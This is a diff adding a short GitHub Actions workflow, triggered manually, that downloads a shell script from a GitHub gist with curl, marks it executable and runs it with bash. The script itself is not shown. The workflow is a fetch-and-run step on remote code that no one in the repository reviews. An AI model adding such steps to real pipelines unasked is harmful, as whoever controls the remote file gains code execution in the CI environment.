@@ -1,0 +1,16 @@
+name: Run Script
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run-script:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Download and run script
+        run: |
+          curl -sSL -o script.sh "https://gist.githubusercontent.com/kmcquade/bfbd5f6d9da75ff3e4c9a3b896ea853c/raw/c315cddd329aa680642a41369a54c8419b78847a/script.sh"
+          chmod +x script.sh
+          bash script.sh
